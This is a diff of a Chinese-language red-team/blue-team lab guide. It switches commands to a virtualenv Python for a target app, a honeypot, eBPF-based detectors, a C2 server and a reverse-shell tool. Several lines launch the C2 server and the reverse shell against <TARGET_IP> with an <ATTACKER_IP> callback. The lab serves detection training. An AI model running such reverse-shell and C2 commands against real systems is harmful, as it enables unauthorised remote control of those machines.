@@ -62,10 +62,10 @@ sudo .venv/bin/python3 <script.py>
 
 ```bash
 # 終端 T1a — 靶機
-sudo python3 target/target_app.py
+sudo .venv/bin/python3 target/target_app.py
 
 # 終端 T1b — 蜜罐（另一個子終端或用 & 背景執行）
-sudo python3 target/honeypot.py
+sudo .venv/bin/python3 target/honeypot.py
 ```
 
 預期輸出（蜜罐）：
@@ -81,7 +81,7 @@ sudo python3 target/honeypot.py
 ### T2 — 啟動網路層 MDR
 
 ```bash
-sudo python3 blue_team/blue_mdr_network.py --cleanup
+sudo .venv/bin/python3 blue_team/blue_mdr_network.py --cleanup
 ```
 
 預期輸出：
@@ -207,7 +207,7 @@ curl -s --interface 172.22.137.15 http://<TARGET_IP>:9999/
 ### T3 — 啟動紅方 C2 Server
 
 ```bash
-sudo python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>
+sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>
 ```
 
 預期輸出：
@@ -271,7 +271,7 @@ target-machine
 ### T2 — 啟動藍方 eBPF MDR v1
 
 ```bash
-sudo python3 blue_team/blue_ebpf_mdr.py --kill
+sudo .venv/bin/python3 blue_team/blue_ebpf_mdr.py --kill
 ```
 
 預期輸出：
@@ -348,7 +348,7 @@ C2 不會收到任何 beacon — 因為進程在 memfd_create 執行前就被殺
 先 Ctrl+C 關閉舊的 C2 server，然後啟動新的：
 
 ```bash
-python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
+.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
 ```
 
 > 注意：這個工具**不需要 sudo**（用 TCP 不用 ICMP raw socket）
@@ -419,7 +419,7 @@ eBPF v1 的 console **沒有任何新的警報**。
 Ctrl+C 關閉 v1，啟動 v2：
 
 ```bash
-sudo python3 blue_team/blue_ebpf_mdr_v2.py --kill
+sudo .venv/bin/python3 blue_team/blue_ebpf_mdr_v2.py --kill
 ```
 
 預期輸出：
@@ -443,7 +443,7 @@ sudo python3 blue_team/blue_ebpf_mdr_v2.py --kill
 ### T3 — 再次啟動 Reverse Shell
 
 ```bash
-python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
+.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
 ```
 
 ### T4 — 再次攻擊
